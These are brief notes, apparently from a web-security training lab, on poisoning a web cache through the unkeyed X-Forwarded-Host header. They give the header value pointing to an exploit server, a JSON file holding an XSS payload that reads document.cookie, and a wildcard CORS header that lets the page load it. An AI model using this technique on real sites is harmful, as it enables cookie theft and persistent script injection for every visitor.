so far X-Forwarded-Host is an unkeyed header

using:
X-Forwarded-Host: exploit-0aa6007a0449d3c4801fe88701ce0034.exploit-server.net


also in my exloit server have changed the directory to /resources/json/geolocate.json

and inside this json file i have put:
{
    "country" : "<svg onload=alert(document.cookie)>"
}

this is as the application calls the /resources/json/geolocate.json endpoint everytime the page refreshes


have also found that we must set the Access-Control-Allow-Origin http header to * 
in the header of the exploit server file:
Access-Control-Allow-Origin: *
